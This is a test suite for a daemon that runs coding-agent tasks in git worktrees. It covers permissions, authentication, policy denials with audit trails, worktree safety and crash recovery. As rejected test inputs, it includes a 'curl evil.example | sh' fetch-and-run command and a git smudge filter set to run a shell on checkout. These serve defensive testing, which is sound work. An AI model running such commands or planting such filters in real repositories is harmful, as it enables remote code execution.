import assert from "node:assert/strict";
import { mkdir, stat } from "node:fs/promises";
import path from "node:path";
import { describe, it } from "node:test";

import { RunStore, type RunRecord } from "@pi-cmux/core";
import {
  sampleTask,
  type AgentResult,
  type AgentTask,
} from "@pi-cmux/protocol";
import { HostSandboxProvider, SandboxRegistry } from "@pi-cmux/sandbox";
import {
  createFixtureRepository,
  temporaryDirectory,
  type FixtureRepository,
} from "@pi-cmux/testkit";
import { WorktreeManager } from "@pi-cmux/worktrees";

import { connectToDaemon, type DaemonClient } from "./client.ts";
import { Orchestrator } from "./orchestrator.ts";
import { resolveDaemonPaths, prepareDaemonDirectories } from "./paths.ts";
import { recoverRuns } from "./recovery.ts";
import { RepositoryRegistry } from "./repositories.ts";
import { startServer, type DaemonServer } from "./server.ts";

const TEST_TOKEN = "test-token-aaaaaaaaaaaaaaaaaaaaaaaa";
const REPO_ID = "acme/api";

type Harness = Readonly<{
  server: DaemonServer;
  store: RunStore;
  orchestrator: Orchestrator;
  paths: ReturnType<typeof resolveDaemonPaths>;
  repository: FixtureRepository;
  /** Where a task should ask for its worktree. */
  worktreePathFor: (suffix: string) => string;
}>;

/**
 * A daemon on a short socket path, with one real repository behind it.
 *
 * `mkdtemp` under the system temp directory produces paths close to the ~104
 * byte `sun_path` limit on macOS, so the socket lives in a short subdirectory
 * rather than alongside the run store.
 *
 * The repository is real because worktree provisioning is now part of starting
 * a run: a fake would only prove that the fake behaves as expected.
 */
async function startHarness(
  root: string,
  workerArgs: readonly string[] = ["--emit", "2"],
): Promise<Harness> {
  const runtimeDir = path.join(root, "r");
  const stateDir = path.join(root, "s");
  await mkdir(runtimeDir, { recursive: true, mode: 0o700 });
  await mkdir(stateDir, { recursive: true, mode: 0o700 });

  const repository = await createFixtureRepository(path.join(root, "repo"));

  const paths = resolveDaemonPaths({ runtimeDir, stateDir });
  const store = new RunStore({ root: stateDir });
  const orchestrator = new Orchestrator({
    store,
    repositories: new RepositoryRegistry([
      { repoId: REPO_ID, path: repository.path },
    ]),
    worktrees: new WorktreeManager({ root: paths.worktreeRoot }),
    sandbox: new SandboxRegistry([new HostSandboxProvider()]),
    workerArgs,
  });

  const server = await startServer({ paths, orchestrator, token: TEST_TOKEN });
  assert.ok(server.ok, "the server must start");

  return {
    server: server.value,
    store,
    orchestrator,
    paths,
    repository,
    worktreePathFor: (suffix) => path.join(paths.worktreeRoot, suffix),
  };
}

let worktreeCounter = 0;

/**
 * A task the harness's daemon can actually run.
 *
 * The worktree path is *requested*, not created: `git worktree add` needs the
 * directory to be absent, and having the daemon create it is the whole point.
 */
function taskFor(
  harness: Harness,
  overrides: Partial<AgentTask> = {},
): AgentTask {
  worktreeCounter += 1;
  const worktree = harness.worktreePathFor(`wt-${String(worktreeCounter)}`);
  const base = sampleTask();

  return {
    ...base,
    workspace: {
      repoId: REPO_ID,
      worktreePath: worktree,
      baseRef: "main",
    },
    constraints: {
      ...base.constraints,
      mayWrite: false,
      mayCommit: false,
      allowedPaths: [path.join(worktree, "src")],
    },
    limits: { softTimeoutMs: 30_000, hardTimeoutMs: 60_000 },
    ...overrides,
  };
}

async function client(harness: Harness): Promise<DaemonClient> {
  const connected = await connectToDaemon({
    socketPath: harness.server.socketPath,
    token: TEST_TOKEN,
  });
  assert.ok(connected.ok, "the client must connect and authenticate");
  return connected.value;
}

/** Wait until a run reaches one of the given states. */
async function waitForState(
  store: RunStore,
  runId: string,
  states: readonly string[],
): Promise<string> {
  for (let attempt = 0; attempt < 200; attempt += 1) {
    const state = await store.readState(runId);
    if (state.ok && states.includes(state.value.state))
      return state.value.state;
    await new Promise((resolve) => setTimeout(resolve, 25));
  }
  assert.fail(`run did not reach ${states.join("|")} in time`);
}

describe("socket and directory permissions", () => {
  it("creates the socket 0600", async () => {
    await using dir = await temporaryDirectory();
    const harness = await startHarness(dir.path);

    const stats = await stat(harness.server.socketPath);
    assert.equal(stats.mode & 0o777, 0o600);

    await harness.server.close();
  });

  it("writes the token 0600", async () => {
    await using dir = await temporaryDirectory();
    const harness = await startHarness(dir.path);

    const stats = await stat(harness.paths.tokenPath);
    assert.equal(stats.mode & 0o777, 0o600);

    await harness.server.close();
  });

  it("refuses a runtime directory readable by others", async () => {
    // A world-readable directory means the token is readable too.
    await using dir = await temporaryDirectory();
    const loose = path.join(dir.path, "loose");
    await mkdir(loose, { recursive: true, mode: 0o755 });

    const prepared = await prepareDaemonDirectories(
      resolveDaemonPaths({ runtimeDir: loose, stateDir: loose }),
    );
    assert.equal(prepared.ok, false);
    assert.match(prepared.error.safeMessage, /accessible to other users/);
  });

  it("refuses a socket path too long for sun_path", async () => {
    const long = path.join("/tmp", "x".repeat(120));
    const prepared = await prepareDaemonDirectories(
      resolveDaemonPaths({ runtimeDir: long, stateDir: long }),
    );
    assert.equal(prepared.ok, false);
    assert.match(prepared.error.safeMessage, /too long/);
  });
});

describe("authentication", () => {
  it("rejects a client with the wrong token", async () => {
    await using dir = await temporaryDirectory();
    const harness = await startHarness(dir.path);

    const connected = await connectToDaemon({
      socketPath: harness.server.socketPath,
      token: "not-the-token",
    });

    assert.equal(connected.ok, false);
    assert.equal(connected.error.code, "RPC_UNAUTHENTICATED");

    await harness.server.close();
  });

  it("refuses every method before the handshake", async () => {
    // Verified at the wire level, since the client always shakes hands.
    await using dir = await temporaryDirectory();
    const harness = await startHarness(dir.path);

    const { connect } = await import("node:net");
    const response = await new Promise<string>((resolve) => {
      const socket = connect(harness.server.socketPath, () => {
        socket.write(
          `${JSON.stringify({ id: "1", method: "daemon.health" })}\n`,
        );
      });
      socket.setEncoding("utf8");
      socket.once("data", (chunk: string) => {
        socket.destroy();
        resolve(chunk);
      });
    });

    const parsed = JSON.parse(response) as {
      ok: boolean;
      error: { code: string };
    };
    assert.equal(parsed.ok, false);
    assert.equal(parsed.error.code, "RPC_UNAUTHENTICATED");

    await harness.server.close();
  });

  it("answers health once authenticated", async () => {
    await using dir = await temporaryDirectory();
    const harness = await startHarness(dir.path);
    const rpc = await client(harness);

    const health = await rpc.call("daemon.health");
    assert.equal(health.ok, true);
    assert.equal((health.value as { status: string }).status, "ok");

    rpc.close();
    await harness.server.close();
  });
});

describe("malformed requests", () => {
  it("reports invalid JSON without mutating anything", async () => {
    await using dir = await temporaryDirectory();
    const harness = await startHarness(dir.path);
    const rpc = await client(harness);

    // A well-formed envelope naming a method with bad params.
    const bad = await rpc.call("task.start", { runId: "not-a-run-id" });
    assert.equal(bad.ok, false);
    assert.equal(bad.error.code, "RPC_MALFORMED");

    // The daemon is still usable.
    assert.equal((await rpc.call("daemon.health")).ok, true);

    rpc.close();
    await harness.server.close();
  });

  it("rejects an unknown method", async () => {
    await using dir = await temporaryDirectory();
    const harness = await startHarness(dir.path);
    const rpc = await client(harness);

    // `RpcMethod` forbids this statically; the wire must refuse it too.
    const unknown = await rpc.call("task.explode" as never, {});
    assert.equal(unknown.ok, false);
    assert.equal(unknown.error.code, "RPC_MALFORMED");

    rpc.close();
    await harness.server.close();
  });

  it("never leaks an internal cause over the wire", async () => {
    await using dir = await temporaryDirectory();
    const harness = await startHarness(dir.path);
    const rpc = await client(harness);

    const missing = await rpc.call("task.status", {
      runId: "run_01JQZX3K5T7V9B2N4M6P8R0AWC",
    });
    assert.equal(missing.ok, false);
    assert.equal(
      Object.hasOwn(missing.error, "cause"),
      false,
      "toWireError must drop the cause",
    );

    rpc.close();
    await harness.server.close();
  });
});

describe("the task lifecycle", () => {
  async function createTask(
    rpc: DaemonClient,
    harness: Harness,
    overrides: Partial<AgentTask> = {},
  ): Promise<RunRecord> {
    const created = await rpc.call("task.create", {
      task: taskFor(harness, overrides),
    });
    assert.ok(created.ok, `task.create failed: ${JSON.stringify(created)}`);
    return created.value as RunRecord;
  }

  it("runs create → start → events → result", async () => {
    await using dir = await temporaryDirectory();
    const harness = await startHarness(dir.path, ["--emit", "3"]);
    const rpc = await client(harness);

    const record = await createTask(rpc, harness);
    assert.equal(record.state, "QUEUED");

    const started = await rpc.call("task.start", { runId: record.runId });
    assert.equal(started.ok, true);

    const finalState = await waitForState(harness.store, record.runId, [
      "SUCCEEDED",
      "FAILED",
    ]);
    assert.equal(finalState, "SUCCEEDED");

    const events = await rpc.call("task.events", { runId: record.runId });
    assert.ok(events.ok);
    // The policy decision plus the worker's own events.
    assert.ok((events.value as unknown[]).length > 3);

    const result = await rpc.call("task.result", { runId: record.runId });
    assert.ok(result.ok);
    assert.equal((result.value as AgentResult).status, "succeeded");

    rpc.close();
    await harness.server.close();
  });

  it("records the policy decision as the run's first event", async () => {
    // An allowed run and a denied one must be equally auditable.
    await using dir = await temporaryDirectory();
    const harness = await startHarness(dir.path);
    const rpc = await client(harness);

    const record = await createTask(rpc, harness);
    const events = await harness.store.readEvents(record.runId);

    assert.ok(events.ok);
    const first = events.value[0];
    assert.ok(first !== undefined, "the run must have an audit event");
    assert.equal(first.type, "policy");
    assert.equal(first.payload["decision"], "allowed");

    rpc.close();
    await harness.server.close();
  });

  it("denies a commit-capable task and still leaves an audit trail", async () => {
    await using dir = await temporaryDirectory();
    const harness = await startHarness(dir.path);
    const rpc = await client(harness);

    // Writes are permitted now that worktrees bound them; commits are not,
    // because there is no approval flow to authorise one.
    const base = taskFor(harness);
    const created = await rpc.call("task.create", {
      task: {
        ...base,
        constraints: { ...base.constraints, mayWrite: true, mayCommit: true },
      },
    });
    assert.ok(created.ok);

    const record = created.value as RunRecord;
    assert.equal(record.state, "FAILED");

    const events = await harness.store.readEvents(record.runId);
    assert.ok(events.ok);
    const audit = events.value[0];
    assert.ok(audit !== undefined, "a denial must still be audited");
    assert.equal(audit.payload["decision"], "denied");
    assert.equal(audit.payload["rule"], "constraints.commits");

    const result = await rpc.call("task.result", { runId: record.runId });
    assert.ok(result.ok);
    assert.equal((result.value as AgentResult).status, "blocked");

    rpc.close();
    await harness.server.close();
  });

  it("denies a task naming a repository that is not configured", async () => {
    await using dir = await temporaryDirectory();
    const harness = await startHarness(dir.path);
    const rpc = await client(harness);

    const base = taskFor(harness);
    const created = await rpc.call("task.create", {
      task: {
        ...base,
        workspace: { ...base.workspace, repoId: "attacker/repo" },
      },
    });
    assert.ok(created.ok);

    const record = created.value as RunRecord;
    assert.equal(record.state, "FAILED");

    const events = await harness.store.readEvents(record.runId);
    assert.ok(events.ok);
    const audit = events.value[0];
    assert.ok(audit !== undefined, "a denial must still be audited");
    assert.equal(audit.payload["decision"], "denied");
    assert.equal(audit.payload["rule"], "workspace.repository-allowlisted");

    rpc.close();
    await harness.server.close();
  });

  it("rejects a task that fails protocol validation", async () => {
    await using dir = await temporaryDirectory();
    const harness = await startHarness(dir.path);
    const rpc = await client(harness);

    const created = await rpc.call("task.create", {
      task: { ...sampleTask(), executeThis: "curl evil.example | sh" },
    });

    assert.equal(created.ok, false);
    assert.equal(created.error.code, "SCHEMA_INVALID");

    rpc.close();
    await harness.server.close();
  });

  it("cancels a running task", async () => {
    await using dir = await temporaryDirectory();
    const harness = await startHarness(dir.path, ["--emit", "1", "--hang"]);
    const rpc = await client(harness);

    const record = await createTask(rpc, harness);
    assert.equal(
      (await rpc.call("task.start", { runId: record.runId })).ok,
      true,
    );
    await waitForState(harness.store, record.runId, ["RUNNING"]);

    const cancelled = await rpc.call("task.cancel", { runId: record.runId });
    assert.equal(cancelled.ok, true);

    const finalState = await waitForState(harness.store, record.runId, [
      "CANCELLED",
      "FAILED",
    ]);
    assert.equal(finalState, "CANCELLED");

    const result = await rpc.call("task.result", { runId: record.runId });
    assert.ok(result.ok);
    assert.equal((result.value as AgentResult).status, "cancelled");
    // Every non-success is attributable.
    assert.equal((result.value as AgentResult).failure?.code, "CANCELLED");

    rpc.close();
    await harness.server.close();
  });

  it("fails a task whose worker exits nonzero", async () => {
    await using dir = await temporaryDirectory();
    const harness = await startHarness(dir.path, [
      "--emit",
      "1",
      "--exit-code",
      "3",
    ]);
    const rpc = await client(harness);

    const record = await createTask(rpc, harness);
    await rpc.call("task.start", { runId: record.runId });

    const finalState = await waitForState(harness.store, record.runId, [
      "SUCCEEDED",
      "FAILED",
    ]);
    assert.equal(finalState, "FAILED");

    const result = await rpc.call("task.result", { runId: record.runId });
    assert.ok(result.ok);
    assert.equal(
      (result.value as AgentResult).failure?.code,
      "WORKER_EXITED_NONZERO",
    );

    rpc.close();
    await harness.server.close();
  });

  it("supports sinceSequence for a reconnecting reader", async () => {
    await using dir = await temporaryDirectory();
    const harness = await startHarness(dir.path, ["--emit", "4"]);
    const rpc = await client(harness);

    const record = await createTask(rpc, harness);
    await rpc.call("task.start", { runId: record.runId });
    await waitForState(harness.store, record.runId, ["SUCCEEDED", "FAILED"]);

    const all = await rpc.call("task.events", { runId: record.runId });
    assert.ok(all.ok);
    const total = (all.value as { sequence: number }[]).length;

    const tail = await rpc.call("task.events", {
      runId: record.runId,
      sinceSequence: 1,
    });
    assert.ok(tail.ok);
    assert.equal((tail.value as unknown[]).length, total - 2);

    rpc.close();
    await harness.server.close();
  });
});

describe("the workspace a run gets", () => {
  it("creates the worktree at the base commit before the worker runs", async () => {
    await using dir = await temporaryDirectory();
    const harness = await startHarness(dir.path, ["--emit", "2"]);
    const rpc = await client(harness);

    const task = taskFor(harness);
    const created = await rpc.call("task.create", { task });
    assert.ok(created.ok);
    const runId = (created.value as RunRecord).runId;

    assert.equal((await rpc.call("task.start", { runId })).ok, true);
    await waitForState(harness.store, runId, ["SUCCEEDED", "FAILED"]);

    // The worker saw a real checkout of the repository, not an empty directory.
    const readme = await stat(
      path.join(task.workspace.worktreePath, "README.md"),
    );
    assert.ok(readme.isFile());

    const result = await rpc.call("task.result", { runId });
    assert.ok(result.ok);
    const changes = (result.value as AgentResult).changes;
    // Observed by agentd, not claimed by the worker.
    assert.equal(changes.headSha, harness.repository.headSha);
    assert.equal(changes.dirty, false);

    rpc.close();
    await harness.server.close();
  });

  it("keeps the worktree after the run, because cleanup is explicit", async () => {
    await using dir = await temporaryDirectory();
    const harness = await startHarness(dir.path, ["--emit", "2"]);
    const rpc = await client(harness);

    const task = taskFor(harness);
    const created = await rpc.call("task.create", { task });
    assert.ok(created.ok);
    const runId = (created.value as RunRecord).runId;
    await rpc.call("task.start", { runId });
    await waitForState(harness.store, runId, ["SUCCEEDED", "FAILED"]);

    // A run that just finished is exactly the one an operator wants to inspect.
    assert.ok((await stat(task.workspace.worktreePath)).isDirectory());

    rpc.close();
    await harness.server.close();
  });

  it("refuses to start two runs in the same worktree", async () => {
    await using dir = await temporaryDirectory();
    const harness = await startHarness(dir.path, ["--emit", "1", "--hang"]);
    const rpc = await client(harness);

    const task = taskFor(harness);
    const first = await rpc.call("task.create", { task });
    const second = await rpc.call("task.create", { task });
    assert.ok(first.ok);
    assert.ok(second.ok);

    const firstRunId = (first.value as RunRecord).runId;
    const secondRunId = (second.value as RunRecord).runId;

    assert.equal(
      (await rpc.call("task.start", { runId: firstRunId })).ok,
      true,
    );
    await waitForState(harness.store, firstRunId, ["RUNNING"]);

    // Spec §12: two writers never share a working directory.
    const clash = await rpc.call("task.start", { runId: secondRunId });
    assert.equal(clash.ok, false);
    assert.equal(clash.error.code, "WORKTREE_CONFLICT");

    const state = await harness.store.readState(secondRunId);
    assert.ok(state.ok);
    assert.equal(state.value.state, "FAILED");

    await rpc.call("task.cancel", { runId: firstRunId });
    rpc.close();
    await harness.server.close();
  });

  it("fails a run whose worktree would escape the root", async () => {
    await using dir = await temporaryDirectory();
    const harness = await startHarness(dir.path);
    const rpc = await client(harness);

    const base = taskFor(harness);
    const escaped = path.join(dir.path, "outside");
    const created = await rpc.call("task.create", {
      task: {
        ...base,
        workspace: { ...base.workspace, worktreePath: escaped },
        constraints: {
          ...base.constraints,
          allowedPaths: [path.join(escaped, "src")],
        },
      },
    });
    assert.ok(created.ok);
    const runId = (created.value as RunRecord).runId;

    // Admission passes: the declared paths are consistent with each other. It
    // is provisioning that knows where worktrees are allowed to live.
    const started = await rpc.call("task.start", { runId });
    assert.equal(started.ok, false);
    assert.equal(started.error.code, "PATH_ESCAPE");

    const result = await rpc.call("task.result", { runId });
    assert.ok(result.ok);
    assert.equal((result.value as AgentResult).failure?.code, "PATH_ESCAPE");

    rpc.close();
    await harness.server.close();
  });

  it("refuses a repository that executes code on checkout", async () => {
    await using dir = await temporaryDirectory();
    const harness = await startHarness(dir.path);
    const rpc = await client(harness);

    const { setLocalConfig } = await import("@pi-cmux/testkit");
    await setLocalConfig(
      harness.repository.path,
      "filter.payload.smudge",
      "/bin/sh -c id",
    );

    const created = await rpc.call("task.create", { task: taskFor(harness) });
    assert.ok(created.ok);
    const runId = (created.value as RunRecord).runId;

    const started = await rpc.call("task.start", { runId });
    assert.equal(started.ok, false);
    assert.equal(started.error.code, "REPO_UNSAFE");

    rpc.close();
    await harness.server.close();
  });
});

describe("restart recovery", () => {
  it("orphans a run whose worker is gone", async () => {
    // The daemon "restarts": a fresh store over the same directory, then
    // recovery. The previous incarnation's in-memory handles are gone.
    await using dir = await temporaryDirectory();
    const harness = await startHarness(dir.path, ["--emit", "1"]);
    const rpc = await client(harness);

    const created = await rpc.call("task.create", {
      task: taskFor(harness),
    });
    assert.ok(created.ok);
    const runId = (created.value as RunRecord).runId;

    // Simulate a crash mid-run: RUNNING on disk, with a pid that is long gone.
    await harness.store.transitionState(runId, "PREPARING");
    await harness.store.transitionState(runId, "RUNNING");
    await harness.store.updateMetadata(runId, {
      pid: 999_999,
      processStartedAtMs: 1_000,
    });

    rpc.close();
    await harness.server.close();

    const restarted = new RunStore({ root: harness.paths.stateDir });
    const report = await recoverRuns({ store: restarted });

    assert.equal(report.orphaned.length, 1);
    const recovered = report.orphaned[0];
    assert.ok(recovered !== undefined);
    assert.equal(recovered.runId, runId);
    assert.equal(recovered.previousState, "RUNNING");
    assert.equal(recovered.newState, "ORPHANED");

    const state = await restarted.readState(runId);
    assert.ok(state.ok);
    assert.equal(state.value.state, "ORPHANED", "never SUCCEEDED by inference");
  });

  it("leaves a terminal run untouched", async () => {
    await using dir = await temporaryDirectory();
    const harness = await startHarness(dir.path, ["--emit", "1"]);
    const rpc = await client(harness);

    const created = await rpc.call("task.create", {
      task: taskFor(harness),
    });
    assert.ok(created.ok);
    const runId = (created.value as RunRecord).runId;

    await rpc.call("task.start", { runId });
    await waitForState(harness.store, runId, ["SUCCEEDED", "FAILED"]);
    rpc.close();
    await harness.server.close();

    const restarted = new RunStore({ root: harness.paths.stateDir });
    const report = await recoverRuns({ store: restarted });

    assert.equal(report.orphaned.length, 0);
    assert.equal(report.untouched, 1);
  });

  it("orphans a mid-flight run that never recorded a process", async () => {
    await using dir = await temporaryDirectory();
    const stateDir = path.join(dir.path, "s");
    await mkdir(stateDir, { recursive: true, mode: 0o700 });
    const store = new RunStore({ root: stateDir });

    const created = await store.create(sampleTask());
    assert.ok(created.ok);
    await store.transitionState(created.value.runId, "PREPARING");

    const report = await recoverRuns({ store });

    assert.equal(report.orphaned.length, 1);
    assert.equal(report.orphaned[0]?.liveness, "not-launched");
  });

  it("does not disturb a QUEUED run, which was never launched", async () => {
    await using dir = await temporaryDirectory();
    const stateDir = path.join(dir.path, "s");
    await mkdir(stateDir, { recursive: true, mode: 0o700 });
    const store = new RunStore({ root: stateDir });

    const created = await store.create(sampleTask());
    assert.ok(created.ok);

    const report = await recoverRuns({ store });
    assert.equal(report.orphaned.length, 0);

    const state = await store.readState(created.value.runId);
    assert.ok(state.ok);
    assert.equal(state.value.state, "QUEUED");
  });
});
